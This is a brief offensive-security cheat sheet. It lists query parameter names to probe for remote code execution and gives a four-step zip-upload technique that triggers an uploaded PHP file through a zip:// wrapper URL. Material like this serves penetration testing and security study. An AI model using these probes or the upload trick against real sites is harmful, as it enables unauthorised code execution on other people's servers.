## Remote Code Execution(RCE) Parameters

?arg={payload}

?cmd={payload}

?code={payload}

?command={payload}

?execute={payload}

?exec={payload}

?exe={payload}

?feature={payload}

?func={payload}

?function={payload}

?jump={payload}

?load={payload}

?module={payload}

?option={payload}

?ping={payload}

?process={payload}

?payload={payload}

?print={payload}

?query={payload}

?req={payload}

?read={payload}

?reg={payload}

?run={payload}

?step={payload}


## Zip Upload RCE

1. Create a .php file (rce.php)

2. Compress it to a .zip file (file.zip)

3. Upload your .zip file on the vulnerable web application.

4. Trigger your RCE via:

( https://<target Site>.com/index.php?page=zip://path/file.zip#rce.php )
